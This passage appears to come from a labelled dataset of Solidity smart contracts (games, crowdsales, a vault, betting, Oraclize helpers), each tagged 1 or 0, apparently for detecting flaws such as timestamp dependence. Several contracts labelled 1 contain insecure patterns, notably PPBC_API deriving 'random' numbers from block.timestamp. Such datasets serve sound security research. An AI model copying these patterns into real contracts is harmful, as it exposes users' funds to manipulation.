_homeUrl, address _invitedBy) payable public isNotPaused isNotContractCaller {        bwData.addUser(msg.sender);        emit UserCreated(msg.sender, _name, _imageUrl, _tag, _homeUrl, block.timestamp, _invitedBy);        bwService.attackTile(msg.sender, _tileId, msg.value, false);    }    function attackTileForExistingUser(uint16 _tileId, uint _attackAmount, bool _useBattleValue) payable public isNotPaused isNotContractCaller {        bwService.verifyAmount(msg.sender, msg.value, _attackAmount, _useBattleValue);        bwService.attackTile(msg.sender, _tileId, _attackAmount, _useBattleValue);    }        function moveBlockValue(uint8 _xSource, uint8 _ySource, uint8 _xDest, uint8 _yDest, uint _moveAmount) public isNotPaused isNotContractCaller {        require(_moveAmount > 0);        bwService.moveBlockValue(msg.sender, _xSource, _ySource, _xDest, _yDest, _moveAmount);    }    function withdrawBattleValue(uint _battleValueInWei) public isNotContractCaller {        require(_battleValueInWei > 0);        uint amountToWithdraw = bwService.withdrawBattleValue(msg.sender, _battleValueInWei);        msg.sender.transfer(amountToWithdraw);    }    function transferBlockValueToBattleValue(uint16 _tileId, uint _amount) public isNotContractCaller {        require(_amount > 0);        address claimer;        uint blockValue;        (claimer, blockValue) = bwData.getTileClaimerAndBlockValue(_tileId);        require(claimer == msg.sender);        uint newBlockValue = blockValue.sub(_amount);        require(newBlockValue == 0 || newBlockValue >= 5 finney);        if(newBlockValue == 0) {            bwData.deleteTile(_tileId);        } else {            bwData.updateTileBlockValue(_tileId, newBlockValue);            bwData.deleteOffer(_tileId); // Offer invalid since block value has changed        }                uint fee = _amount.mul(BV_TO_BP_FEE).div(100);        uint userAmount = _amount.sub(fee);        uint feeBalance = bwData.getFeeBalance();        feeBalance = feeBalance.add(fee);        bwData.setFeeBalance(feeBalance);        bwService.addUserBattleValue(msg.sender, userAmount);        bwService.subGlobalBlockValueBalance(_amount);        emit TileRetreated(_tileId, msg.sender, _amount, newBlockValue, block.timestamp);    }    function getLocalBountyBalance(uint16 _tileId) view public isNotContractCaller returns (uint) {        address localGameAddress = bwService.getLocalGame(_tileId);        require(localGameAddress != 0);        LocalGameI localGame = LocalGameI(localGameAddress);        return localGame.getBountyBalance();    }    function getTimeLeftToNextLocalBountyCollect(uint16 _tileId) view public isNotContractCaller returns (uint) {        address localGameAddress = bwService.getLocalGame(_tileId);        require(localGameAddress != 0);        LocalGameI localGame = LocalGameI(localGameAddress);        address claimer;        uint blockValue;        uint latestClaimTime;        uint sellPrice;        (claimer, blockValue, latestClaimTime, sellPrice) = bwData.getTile(_tileId);        return localGame.getTimeLeftToNextCollect(claimer, latestClaimTime);    }    function collectLocalBounty(uint16 _tileId, uint _amount) public isNotContractCaller {        address localGameAddress = bwService.getLocalGame(_tileId);        require(localGameAddress != 0);        address claimer;        uint blockValue;        uint latestClaimTime;        uint sellPrice;        (claimer, blockValue, latestClaimTime, sellPrice) = bwData.getTile(_tileId);        require(latestClaimTime != 0 && claimer == msg.sender);                LocalGameI localGame = LocalGameI(localGameAddress);        uint amountCollected = localGame.collectBounty(msg.sender, latestClaimTime, _amount);        emit BountyCollected(_tileId, msg.sender, _amount, amountCollected, block.timestamp, latestClaimTime);    }    function createNewUser(bytes32 _name, bytes _imageUrl, bytes32 _tag, bytes32 _homeUrl, address _user) public isOwner {        bwData.addUser(_user);        emit UserCreated(_user, _name, _imageUrl, _tag, _homeUrl, block.timestamp, msg.sender); //check on client if invitedBy is owner.    }    function censorUser(address _userAddress, bool _censored) public isOwner {        bwData.censorUser(_userAddress, _censored);        emit UserCensored(_userAddress, _censored);    }    function setPaused(bool _paused) public isOwner {        paused = _paused;    }    function kill() public isOwner {        selfdestruct(owner);    }        function withdrawFee() public isOwner {        uint balance = address(this).balance;        uint amountToWithdraw = bwData.getFeeBalance();        if (balance < amountToWithdraw) { // Should never happen, but paranoia            amountToWithdraw = balance;        }        bwData.setFeeBalance(0);        owner.transfer(amountToWithdraw);    }    function getFee() view public isOwner returns (uint) {        return bwData.getFeeBalance();    }    function setBvToBpFee(uint _feePercentage) public isOwner {        BV_TO_BP_FEE = _feePercentage;    }    function depositBattleValue(address _user) payable public isOwner {        require(msg.value % 1 finney == 0); // Must be divisible by 1 finney        bwService.addUserBattleValue(_user, msg.value);    }    function transferTileFromOwner(uint16[] _tileIds, address _newOwner) public isOwner {        for(uint i = 0; i < _tileIds.length; ++i) {            uint16 tileId = _tileIds[i];            address claimer = bwData.getCurrentClaimerForTile(tileId);            require(claimer == owner);            bwData.setClaimerForTile(tileId, _newOwner);                        emit TransferTileFromOwner(tileId, _newOwner, msg.sender, block.timestamp);        }    }    function transferTokens(address _tokenAddress, address _recipient) public isOwner {        ERC20I token = ERC20I(_tokenAddress);        require(token.transfer(_recipient, token.balanceOf(this)));    }}
1<CODESPLIT>contract ArnaVault {    uint256 amount;    uint startTime;    uint period;    uint256 percent;    function tokensAvailable() public returns (uint256){        return ((block.timestamp - startTime) / period + 1) * amount * (percent / 100000);    }}
1<CODESPLIT>contract PPBC_API {    uint256 private lastBlock;    uint256 private lastRandom;    function createRandomNumber(uint maxnum) returns (uint256) {        uint cnt;        for (cnt = 0; cnt < lastRandom % 5; cnt++){            lastBlock = lastBlock - block.timestamp;        }        return lastBlock;    }}
0<CODESPLIT>contract Util{    function Util() public{}    function strConcat(string _a, string _b, string _c, string _d, string _e) internal pure returns (string){        bytes memory _ba = bytes(_a);        bytes memory _bb = bytes(_b);        bytes memory _bc = bytes(_c);        bytes memory _bd = bytes(_d);        bytes memory _be = bytes(_e);        string memory abcde = new string(_ba.length + _bb.length + _bc.length + _bd.length + _be.length);        bytes memory babcde = bytes(abcde);        uint k = 0;        for (uint i = 0; i < _ba.length; i++) babcde[k++] = _ba[i];        for (i = 0; i < _bb.length; i++) babcde[k++] = _bb[i];        for (i = 0; i < _bc.length; i++) babcde[k++] = _bc[i];        for (i = 0; i < _bd.length; i++) babcde[k++] = _bd[i];        for (i = 0; i < _be.length; i++) babcde[k++] = _be[i];        return string(babcde);    }    function strConcat(string _a, string _b, string _c, string _d) internal pure returns (string) {        return strConcat(_a, _b, _c, _d, "");    }    function strConcat(string _a, string _b, string _c) internal pure returns (string) {        return strConcat(_a, _b, _c, "", "");    }    function strConcat(string _a, string _b) internal pure returns (string) {        return strConcat(_a, _b, "", "", "");    }    function toString(address x) internal pure returns (string) {        bytes memory b = new bytes(20);        for (uint i = 0; i < 20; i++)        b[i] = byte(uint8(uint(x) / (2**(8*(19 - i)))));        return string(b);    }}
0<CODESPLIT>contract SmartVows is Ownable, Util {    string public partner1_name;    string public partner2_name;        address public partner1_address;    address public partner2_address;        string public partner1_vows;    string public partner2_vows;    string public marriageDate;    string public maritalStatus;    bytes public coupleImageIPFShash;    bytes public marriageLicenceImageIPFShash;    string public prenupAgreement;        string public partner1_will;    string public partner2_will;    bool public partner1_signed;    bool public partner2_signed;        bool public partner1_voted_update_prenup;    bool public partner2_voted_update_prenup;        bool public partner1_voted_update_marriage_status;    bool public partner2_voted_update_marriage_status;         bool public is_signed;        string public officiant;    string public witnesses;    string public location;        Event[] public lifeEvents;    struct Event {        uint date;        string name;        string description;        string mesg;    }        uint public eventcount;     event LifeEvent(string name, string description, string mesg);    contractEvent[] public contractEvents;    struct contractEvent {        uint ce_date;        string ce_description;        string ce_mesg;    }        uint public contracteventcount;     event ContractEvent(string ce_description, string ce_mesg);    function SmartVows(string _partner1, address _partner1_address, string _partner2, address _partner2_address, string _marriageDate, string _maritalStatus, string _officiant, string _witnesses, string _location, string coupleImageIPFShash, string marriageLicenceImageIPFShash) public{                partner1_name = _partner1;        partner2_name = _partner2;          partner1_address=_partner1_address;        partner2_address=_partner2_address;        marriageDate =_marriageDate;        maritalStatus = _maritalStatus;        officiant=_officiant;        witnesses=_witnesses;        location=_location;        saveContractEvent("Blockchain marriage smart contract created","Marriage smart contract added to the blockchain");            }    function addLifeEvent(string name, string description, string mesg) public{        require(msg.sender == owner || msg.sender == partner1_address || msg.sender == partner2_address);        saveLifeEvent(name, description, mesg);    }    function saveLifeEvent(string name, string description, string mesg) private {        lifeEvents.push(Event(block.timestamp, name, description, mesg));        LifeEvent(name, description, mesg);        eventcount++;    }            function saveContractEvent(string description, string mesg) private {        contractEvents.push(contractEvent(block.timestamp, description, mesg));        ContractEvent(description, mesg);        contracteventcount++;    }        function updatePartner1_vows(string _partner1_vows) public {        require((msg.sender == owner || msg.sender == partner1_address) && (bytes(partner1_vows).length == 0));        partner1_vows = _partner1_vows;    }    function updatePartner2_vows(string _partner2_vows) public {        require((msg.sender == owner || msg.sender == partner2_address) && (bytes(partner2_vows).length == 0));        partner2_vows = _partner2_vows;    }    function updateMaritalStatus(string _maritalStatus) public {        require((msg.sender == owner || msg.sender == partner1_address || msg.sender == partner2_address) && (partner1_voted_update_marriage_status == true)&&(partner2_voted_update_marriage_status == true));        saveContractEvent("Marital status updated", strConcat("Marital status changed from ", maritalStatus , " to ", _maritalStatus));        maritalStatus = _maritalStatus;        partner1_voted_update_marriage_status = false;        partner2_voted_update_marriage_status = false;    }    function sign() public {        require(msg.sender == partner1_address || msg.sender == partner2_address);        if(msg.sender == partner1_address){            partner1_signed = true;            saveContractEvent("Marriage signed", "Smart Contract signed by Partner 1");        }else {            partner2_signed = true;            saveContractEvent("Marriage signed", "Smart Contract signed by Partner 2");        }                if(partner1_signed && partner2_signed){// if both signed then make the contract as signed            is_signed = true;        }    }            function voteToUpdateMaritalStatus() public {        if(msg.sender == partner1_address){            partner1_voted_update_marriage_status = true;            saveContractEvent("Vote - Change Marital Status", "Partner 1 voted to updated Marital Status");        }        if(msg.sender == partner2_address){            partner2_voted_update_marriage_status = true;            saveContractEvent("Vote - Change Marital Status", "Partner 2 voted to updated Marital Status");        }    }        function voteToUpdatePrenup() public {        if(msg.sender == partner1_address){            partner1_voted_update_prenup = true;            saveContractEvent("Vote - Update Prenup", "Partner 1 voted to updated Prenuptial Aggreement");        }        if(msg.sender == partner2_address){            partner2_voted_update_prenup = true;            saveContractEvent("Vote - Update Prenup", "Partner 2 voted to updated Prenuptial Aggreement");        }    }    function updateCoupleImageIPFShash(bytes _coupleImageIPFShash) public{        require(msg.sender == owner || msg.sender == partner1_address || msg.sender == partner2_address);        coupleImageIPFShash = _coupleImageIPFShash;    }    function updateMarriageLicenceImageIPFShash(bytes _marriageLicenceImageIPFShash) public{        require(msg.sender == owner || msg.sender == partner1_address || msg.sender == partner2_address);        marriageLicenceImageIPFShash = _marriageLicenceImageIPFShash;    }    function updatePrenup(string _prenupAgreement) public{        require((msg.sender == owner || msg.sender == partner1_address || msg.sender == partner2_address) && (partner1_voted_update_prenup == true)&&(partner2_voted_update_prenup == true));        prenupAgreement = _prenupAgreement;        saveContractEvent("Update - Prenup", "Prenuptial Agreement Updated");        partner1_voted_update_prenup = false;        partner2_voted_update_prenup = false;    }         function updatePartner1_will(string _partner1_will) public {        require(msg.sender == partner1_address);        partner1_will = _partner1_will;        saveContractEvent("Update - Will", "Partner 1 Will Updated");    }      function updatePartner2_will(string _partner2_will) public {        require(msg.sender == partner2_address);        partner2_will = _partner2_will;        saveContractEvent("Update - Will", "Partner 2 Will Updated");    }    }
0<CODESPLIT>contract DynamicRateCrowdsale is Crowdsale {    using SafeMath for uint256;         uint256 public bonusRate;    constructor(uint256 _bonusRate) public {        require(_bonusRate > 0);        bonusRate = _bonusRate;    }    function getCurrentRate() public view returns (uint256) {        return rate.add(bonusRate);    }    function _getTokenAmount(uint256 _weiAmount)        internal view returns (uint256)    {        uint256 currentRate = getCurrentRate();        return currentRate.mul(_weiAmount);    }}  
0<CODESPLIT>contract AllowanceCrowdsale is Crowdsale {  using SafeMath for uint256;  address public tokenWallet;     constructor(address _tokenWallet) public {    require(_tokenWallet != address(0));    tokenWallet = _tokenWallet;  }     function remainingTokens() public view returns (uint256) {    return token.allowance(tokenWallet, this);  }     function _deliverTokens(    address _beneficiary,    uint256 _tokenAmount  )    internal  {    token.transferFrom(tokenWallet, _beneficiary, _tokenAmount);  }}  
1<CODESPLIT>contract EoptCrowdsale is Crowdsale, CappedCrowdsale, AllowanceCrowdsale, DynamicRateCrowdsale, TimedCrowdsale, Ownable {        constructor(        uint256 _rate,         uint256 _bonusRate,         address _wallet,         ERC20 _token,         uint256 _cap,         address _tokenWallet,        uint256 _openingTime,        uint256 _closingTime    )        Crowdsale(_rate, _wallet, _token)        CappedCrowdsale(_cap)        AllowanceCrowdsale(_tokenWallet)        TimedCrowdsale(_openingTime, _closingTime)        DynamicRateCrowdsale(_bonusRate)        public    {               }         event Purchase(        address indexed purchaser,        address indexed beneficiary,        uint256 value,        uint256 amount,        uint256 weiRaised,        uint256 rate,        uint256 bonusRate,        uint256 cap    );    function _updatePurchasingState(address _beneficiary, uint256 _weiAmount)        internal    {        super._updatePurchasingState(_beneficiary, _weiAmount);        uint256 tokens = _getTokenAmount(_weiAmount);        emit Purchase(            msg.sender,            _beneficiary,            _weiAmount,            tokens,            weiRaised,            rate,            bonusRate,            cap        );    }         function setRate(uint256 _rate) onlyOwner public {        require(_rate > 0 && _rate < 1000000);        rate = _rate;    }         function setBonusRate(uint256 _bonusRate) onlyOwner public {        require(_bonusRate > 0 && _bonusRate < 1000000);        bonusRate = _bonusRate;    }         function setClosingTime(uint256 _closingTime) onlyOwner public {        require(_closingTime >= block.timestamp);        require(_closingTime >= openingTime);        closingTime = _closingTime;    }         function setCap(uint256 _cap) onlyOwner public {        require(_cap > 0 && _cap < 500000000000000000000000);        cap = _cap;    }         function setToken(ERC20 _token) onlyOwner public {        require(_token != address(0));        token = _token;    }         function setTokenWallet(address _tokenWallet) onlyOwner public {        require(_tokenWallet != address(0));        tokenWallet = _tokenWallet;    }         function setWallet(address _wallet) onlyOwner public {        require(_wallet != address(0));        wallet = _wallet;    }}
0<CODESPLIT>contract ERC721Abstract{	function implementsERC721() public pure returns (bool);	function balanceOf(address _owner) public view returns (uint256 balance);	function ownerOf(uint256 _tokenId) public view returns (address owner);	function approve(address _to, uint256 _tokenId) public;	function transferFrom(address _from, address _to, uint256 _tokenId) public;	function transfer(address _to, uint256 _tokenId) public; 	event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);	event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);}
0<CODESPLIT>contract Functional{	function parseInt(string _a, uint _b) internal pure returns (uint) 	{		bytes memory bresult = bytes(_a);		uint mint = 0;		bool decimals = false;		for (uint i=0; i<bresult.length; i++){			if ((bresult[i] >= 48)&&(bresult[i] <= 57)){				if (decimals){				   if (_b == 0) break;					else _b--;				}				mint *= 10;				mint += uint(bresult[i]) - 48;			} else if (bresult[i] == 46) decimals = true;		}		if (_b > 0) mint *= 10**_b;		return mint;	}		function uint2str(uint i) internal pure returns (string)	{		if (i == 0) return "0";		uint j = i;		uint len;		while (j != 0){			len++;			j /= 10;		}		bytes memory bstr = new bytes(len);		uint k = len - 1;		while (i != 0){			bstr[k--] = byte(48 + i % 10);			i /= 10;		}		return string(bstr);	}		function strConcat(string _a, string _b, string _c) internal pure returns (string)	{		bytes memory _ba = bytes(_a);		bytes memory _bb = bytes(_b);		bytes memory _bc = bytes(_c);		string memory abc;		uint k = 0;		uint i;		bytes memory babc;		if (_ba.length==0)		{			abc = new string(_bc.length);			babc = bytes(abc);		}		else		{			abc = new string(_ba.length + _bb.length+ _bc.length);			babc = bytes(abc);			for (i = 0; i < _ba.length; i++) babc[k++] = _ba[i];			for (i = 0; i < _bb.length; i++) babc[k++] = _bb[i];		}        for (i = 0; i < _bc.length; i++) babc[k++] = _bc[i];		return string(babc);	}		function timenow() public view returns(uint32) { return uint32(block.timestamp); }}
0<CODESPLIT>contract CryptoSportZ is ERC721, Functional, Owned{	uint256 public feeGame;		enum Status {		NOTFOUND,		//0 game not created		PLAYING,		//1 buying tickets		PROCESSING,		//2 waiting for result		PAYING,	 		//3 redeeming		CANCELING		//4 canceling the game	}		struct Game {		string  nameGame;		uint32  countCombinations;		uint32  dateStopBuy;		uint32  winCombination;		uint256 betsSumIn;				// amount bets		uint256 feeValue;				// amount fee		Status status;					// status of game		bool isFreezing;	}	mapping (uint256 => Game) private game;	uint32 public countGames;		uint32 private constant shiftGame = 0;	uint32 private constant FEECONTRACT = 5;		struct Stake {		uint256 sum;		// amount bets		uint32 count;		// count bets 	}	mapping(uint32 => mapping (uint32 => Stake)) public betsAll; // ID-game => combination => Stake	mapping(bytes32 => uint32) private queryRes;  // ID-query => ID-game		event LogEvent(string _event, string nameGame, uint256 value);	event LogToken(string _event, address user, uint32 idGame, uint256 idToken, uint32 combination, uint256 amount);    modifier onlyOwner {        require(msg.sender == owner);        _;    }		modifier onlyAdmin {        require(msg.sender == owner || admins[msg.sender]);        _;    }	function getPriceTicket() public view returns ( uint32 )	{		if ( timenow() >= 1531339200 ) return 8000;	// after 11.07 20:00		if ( timenow() >= 1530993600 ) return 4000;	// after 07.07 20:00		if ( timenow() >= 1530648000 ) return 2000;	// after 03.06 20:00		if ( timenow() >= 1530302400 ) return 1000;	// after 29.06 20:00		if ( timenow() >= 1529870400 ) return 500;	// after 24.06 20:00		if ( timenow() >= 1529438400 ) return 400;	// after 19.06 20:00		if ( timenow() >= 1529006400 ) return 300;	// after 14.06 20:00		if ( timenow() >= 1528747200 ) return 200;	// after 11.06 20:00		if ( timenow() >= 1528401600 ) return 100;	// after 07.06 20:00		return 50;	}		function getGameByID(uint32 _id) public view returns (		string  nameGame,		uint32 countCombinations,		uint32 dateStopBuy,		uint32 priceTicket,		uint32 winCombination,		uint32 betsCount,		uint256 betsSumIn,		uint256 feeValue,		Status status,		bool isFreezing	){		Game storage gm = game[_id];		nameGame = gm.nameGame;		countCombinations = gm.countCombinations;		dateStopBuy = gm.dateStopBuy;		priceTicket = getPriceTicket();		winCombination = gm.winCombination;		betsCount = getCountTokensByGame(_id);		betsSumIn = gm.betsSumIn;  		if (betsSumIn==0) betsSumIn = getSumInByGame(_id);		feeValue = gm.feeValue;		status = gm.status;		if ( status == Status.PLAYING && timenow() > dateStopBuy ) status = Status.PROCESSING;		isFreezing = gm.isFreezing;	}		function getBetsMas(uint32 idGame) public view returns (uint32[33])	{		Game storage curGame = game[idGame];		uint32[33] memory res;		for(uint32 i=1;i<=curGame.countCombinations;i++) res[i] = betsAll[idGame][i].count;		return res;	}		function getCountTokensByGame(uint32 idGame) internal view returns (uint32)	{		Game storage curGame = game[idGame];		uint32 count = 0;		for(uint32 i=1;i<=curGame.countCombinations;i++) count += betsAll[idGame][i].count;		return count;	}		function getSumInByGame(uint32 idGame) internal view returns (uint256)	{		Game storage curGame = game[idGame];		uint256 sum = 0;		for(uint32 i=1;i<=curGame.countCombinations;i++) sum += betsAll[idGame][i].sum;		return sum;	}		function getTokenByID(uint256 _id) public view returns ( 			uint256 price,			uint256 payment,			uint32 combination,			uint32 dateBuy,			uint32 idGame,			address ownerToken,			bool payout	){		Token storage tkn = tokens[_id];		price = tkn.price;				uint256 packed = tkn.option;		payout 		= uint8((packed >> (12*8)) & 0xFF)==1?true:false;		idGame  	= uint32((packed >> (8*8)) & 0xFFFFFFFF);		combination = uint32((packed >> (4*8)) & 0xFFFFFFFF);		dateBuy     = uint32(packed & 0xFFFFFFFF);		payment = 0;		Game storage curGame = game[idGame];				uint256 betsSumIn = curGame.betsSumIn;  		if (betsSumIn==0) betsSumIn = getSumInByGame(idGame);		if (curGame.winCombination==combination) payment = betsSumIn / betsAll[idGame][ curGame.winCombination ].count;		if (curGame.status == Status.CANCELING) payment = tkn.price;				ownerToken = tokenIndexToOwner[_id];	}	function getUserTokens(address user, uint32 count) public view returns ( string res )	{		res="";		require(user!=0x0);		uint32 findCount=0;		for (uint256 i = totalSupply-1; i >= 0; i--)		{			if(i>totalSupply) break;			if (user == tokenIndexToOwner[i]) 			{				res = strConcat( res, ",", uint2str(i) );				findCount++;				if (count!=0 && findCount>=count) break;			}		}	}		function getUserTokensByGame(address user, uint32 idGame) public view returns ( string res )	{		res="";		require(user!=0x0);		for(uint256 i=0;i<totalSupply;i++) 		{			if (user == tokenIndexToOwner[i]) 			{				uint256 packed = tokens[i].option;				uint32 idGameToken = uint32((packed >> (8*8)) & 0xFFFFFFFF);				if (idGameToken == idGame) res = strConcat( res, ",", uint2str(i) );			}		}	}		function getTokensByGame(uint32 idGame) public view returns (string res)	{		res="";		for(uint256 i=0;i<totalSupply;i++) 		{			uint256 packed = tokens[i].option;			uint32 idGameToken = uint32((packed >> (8*8)) & 0xFFFFFFFF);			if (idGameToken == idGame) res = strConcat( res, ",", uint2str(i) );		}	}			function getStatGames() public view returns ( 			uint32 countAll,			uint32 countPlaying,			uint32 countProcessing,			string listPlaying,			string listProcessing	){		countAll = countGames;		countPlaying = 0;		countProcessing = 0;		listPlaying="";		listProcessing="";		uint32 curtime = timenow();		for(uint32 i=shiftGame; i<countAll+shiftGame; i++)		{			if (game[i].status!=Status.PLAYING) continue;			if (curtime <  game[i].dateStopBuy) { countPlaying++; listPlaying = strConcat( listPlaying, ",", uint2str(i) ); }			if (curtime >= game[i].dateStopBuy) { countProcessing++; listProcessing = strConcat( listProcessing, ",", uint2str(i) ); }		}	}	function CryptoSportZ() public 	{	}	function freezeGame(uint32 idGame, bool freeze) public onlyAdmin 	{		Game storage curGame = game[idGame];		require( curGame.isFreezing != freeze );		curGame.isFreezing = freeze; 	}		function addGame( string _nameGame ) onlyAdmin public 	{		require( bytes(_nameGame).length > 2 );		Game memory _game;		_game.nameGame = _nameGame;		_game.countCombinations = 32;		_game.dateStopBuy = 1531666800;		_game.status = Status.PLAYING;		uint256 newGameId = countGames + shiftGame;		game[newGameId] = _game;		countGames++;				LogEvent( "AddGame", _nameGame, newGameId );	}	function () payable public { require (msg.value == 0x0); }		function buyToken(uint32 idGame, uint32 combination, address captainAddress) payable public	{		Game storage curGame = game[idGame];		require( curGame.status == Status.PLAYING );		require( timenow() < curGame.dateStopBuy );		require( combination > 0 && combination <= curGame.countCombinations );		require( curGame.isFreezing == false );				uint256 userStake = msg.value;		uint256 ticketPrice = uint256(getPriceTicket()) * 1 finney;				require( userStake >= ticketPrice );				if ( userStake > ticketPrice )		{			uint256 change = userStake - ticketPrice;			userStake = userStake - change;			require( userStake == ticketPrice );			msg.sender.transfer(change);		}				uint256 feeValue = userStake * FEECONTRACT / 100;		// fee for contract		if (captainAddress!=0x0 && captainAddress != msg.sender) 		{			uint256 captainValue = feeValue * 20 / 100;		// bonus for captain = 1%			feeValue = feeValue - captainValue;			captainAddress.transfer(captainValue);		}		userStake = userStake - feeValue;			curGame.feeValue  = curGame.feeValue + feeValue;				betsAll[idGame][combination].sum += userStake;		betsAll[idGame][combination].count += 1;		uint256 packed;		packed = ( uint128(idGame) << 8*8 ) + ( uint128(combination) << 4*8 ) + uint128(block.timestamp);		Token memory _token = Token({			price: userStake,			option : packed		});		uint256 newTokenId = totalSupply++;		tokens[newTokenId] = _token;		_transfer(0x0, msg.sender, newTokenId);		LogToken( "Buy", msg.sender, idGame, newTokenId, combination, userStake);	}		function redeemToken(uint256 _tokenId) public 	{		Token storage tkn = tokens[_tokenId];		uint256 packed = tkn.option;		bool payout = uint8((packed >> (12*8)) & 0xFF)==1?true:false;		uint32 idGame = uint32((packed >> (8*8)) & 0xFFFFFFFF);		uint32 combination = uint32((packed >> (4*8)) & 0xFFFFFFFF);		Game storage curGame = game[idGame];				require( curGame.status == Status.PAYING || curGame.status == Status.CANCELING);		require( msg.sender == tokenIndexToOwner[_tokenId] );	// only onwer`s token		require( payout == false ); // has not paid		require( combination == curGame.winCombination || curGame.status == Status.CANCELING );		uint256 sumPayment = 0;		if ( curGame.status == Status.CANCELING ) sumPayment = tkn.price;		if ( curGame.status == Status.PAYING ) sumPayment = curGame.betsSumIn / betsAll[idGame][curGame.winCombination].count;		payout = true;		packed += uint128(payout?1:0) << 12*8;		tkn.option = packed;			msg.sender.transfer(sumPayment);				LogToken( "Redeem", msg.sender, idGame, uint32(_tokenId), combination, sumPayment);	}		function cancelGame(uint32 idGame) public 	{		Game storage curGame = game[idGame];				require( curGame.status == Status.PLAYING );		require( msg.sender == owner || admins[msg.sender] || timenow() > curGame.dateStopBuy + 60 days );		curGame.status = Status.CANCELING;				takeFee(idGame);	}	function resolveGameByHand(uint32 idGame, uint32 combination) onlyAdmin public 	{		Game storage curGame = game[idGame];				require( curGame.status == Status.PLAYING );		require( combination <= curGame.countCombinations );		require( combination != 0 );		require( timenow() > curGame.dateStopBuy + 2*60*60 );		curGame.winCombination = combination;						checkWinNobody(idGame);	}		function checkWinNobody(uint32 idGame) internal	{		Game storage curGame = game[idGame];				curGame.status = Status.PAYING;		curGame.betsSumIn = getSumInByGame(idGame);				if ( betsAll[idGame][curGame.winCombination].count == 0 )		{			if (curGame.betsSumIn+curGame.feeValue!=0) feeGame = feeGame + curGame.betsSumIn + curGame.feeValue;			LogEvent( "NobodyWin", curGame.nameGame, curGame.betsSumIn+curGame.feeValue );		}		else 			takeFee(idGame);	}		function takeFee(uint32 idGame) internal	{		Game storage curGame = game[idGame];				if ( curGame.feeValue > 0 )		{			feeGame = feeGame + curGame.feeValue;			LogEvent( "TakeFee", curGame.nameGame, curGame.feeValue );		}	}		function withdraw() onlyOwner public	{		require( feeGame > 0 );		uint256 tmpFeeGame = feeGame;		feeGame = 0;				owner.transfer(tmpFeeGame);	}}
0<CODESPLIT>contract OraclizeI {    address public cbAddress;    function query(uint _timestamp, string _datasource, string _arg) payable returns (bytes32 _id);    function query_withGasLimit(uint _timestamp, string _datasource, string _arg, uint _gaslimit) payable returns (bytes32 _id);    function query2(uint _timestamp, string _datasource, string _arg1, string _arg2) payable returns (bytes32 _id);    function query2_withGasLimit(uint _timestamp, string _datasource, string _arg1, string _arg2, uint _gaslimit) payable returns (bytes32 _id);    function queryN(uint _timestamp, string _datasource, bytes _argN) payable returns (bytes32 _id);    function queryN_withGasLimit(uint _timestamp, string _datasource, bytes _argN, uint _gaslimit) payable returns (bytes32 _id);    function getPrice(string _datasource) returns (uint _dsprice);    function getPrice(string _datasource, uint gaslimit) returns (uint _dsprice);    function useCoupon(string _coupon);    function setProofType(byte _proofType);    function setConfig(bytes32 _config);    function setCustomGasPrice(uint _gasPrice);    function randomDS_getSessionPubKeyHash() returns(bytes32);}
0<CODESPLIT>contract OraclizeAddrResolverI {    function getAddress() returns (address _addr);}
0<CODESPLIT>contract usingOraclize {    uint constant day = 60*60*24;    uint constant week = 60*60*24*7;    uint constant month = 60*60*24*30;    byte constant proofType_NONE = 0x00;    byte constant proofType_TLSNotary = 0x10;    byte constant proofType_Android = 0x20;    byte constant proofType_Ledger = 0x30;    byte constant proofType_Native = 0xF0;    byte constant proofStorage_IPFS = 0x01;    uint8 constant networkID_auto = 0;    uint8 constant networkID_mainnet = 1;    uint8 constant networkID_testnet = 2;    uint8 constant networkID_morden = 2;    uint8 constant networkID_consensys = 161;    OraclizeAddrResolverI OAR;    OraclizeI oraclize;    modifier oraclizeAPI {        if((address(OAR)==0)||(getCodeSize(address(OAR))==0)) oraclize_setNetwork(networkID_auto);        oraclize = OraclizeI(OAR.getAddress());        _;    }    modifier coupon(string code){        oraclize = OraclizeI(OAR.getAddress());        oraclize.useCoupon(code);        _;    }    function oraclize_setNetwork(uint8 networkID) internal returns(bool){        if (getCodeSize(0x1d3B2638a7cC9f2CB3D298A3DA7a90B67E5506ed)>0){ //mainnet            OAR = OraclizeAddrResolverI(0x1d3B2638a7cC9f2CB3D298A3DA7a90B67E5506ed);            oraclize_setNetworkName("eth_mainnet");            return true;        }        if (getCodeSize(0xc03A2615D5efaf5F49F60B7BB6583eaec212fdf1)>0){ //ropsten testnet            OAR = OraclizeAddrResolverI(0xc03A2615D5efaf5F49F60B7BB6583eaec212fdf1);            oraclize_setNetworkName("eth_ropsten3");            return true;        }        if (getCodeSize(0xB7A07BcF2Ba2f2703b24C0691b5278999C59AC7e)>0){ //kovan testnet            OAR = OraclizeAddrResolverI(0xB7A07BcF2Ba2f2703b24C0691b5278999C59AC7e);            oraclize_setNetworkName("eth_kovan");            return true;        }        if (getCodeSize(0x146500cfd35B22E4A392Fe0aDc06De1a1368Ed48)>0){ //rinkeby testnet            OAR = OraclizeAddrResolverI(0x146500cfd35B22E4A392Fe0aDc06De1a1368Ed48);            oraclize_setNetworkName("eth_rinkeby");            return true;        }        if (getCodeSize(0x6f485C8BF6fc43eA212E93BBF8ce046C7f1cb475)>0){ //ethereum-bridge            OAR = OraclizeAddrResolverI(0x6f485C8BF6fc43eA212E93BBF8ce046C7f1cb475);            return true;        }        if (getCodeSize(0x20e12A1F859B3FeaE5Fb2A0A32C18F5a65555bBF)>0){ //ether.camp ide            OAR = OraclizeAddrResolverI(0x20e12A1F859B3FeaE5Fb2A0A32C18F5a65555bBF);            return true;        }        if (getCodeSize(0x51efaF4c8B3C9AfBD5aB9F4bbC82784Ab6ef8fAA)>0){ //browser-solidity            OAR = OraclizeAddrResolverI(0x51efaF4c8B3C9AfBD5aB9F4bbC82784Ab6ef8fAA);            return true;        }        return false;    }    function __callback(bytes32 myid, string result) {        __callback(myid, result, new bytes(0));    }    function __callback(bytes32 myid, string result, bytes proof) {    }        function oraclize_useCoupon(string code) oraclizeAPI internal {        oraclize.useCoupon(code);    }    function oraclize_getPrice(string datasource) oraclizeAPI internal returns (uint){        return oraclize.getPrice(datasource);    }    function oraclize_getPrice(string datasource, uint gaslimit) oraclizeAPI internal returns (uint){        return oraclize.getPrice(datasource, gaslimit);    }        function oraclize_query(string datasource, string arg) oraclizeAPI internal returns (bytes32 id){        uint price = oraclize.getPrice(datasource);        if (price > 1 ether + tx.gasprice*200000) return 0; // unexpectedly high price        return oraclize.query.value(price)(0, datasource, arg);    }    function oraclize_query(uint timestamp, string datasource, string arg) oraclizeAPI internal returns (bytes32 id){        uint price = 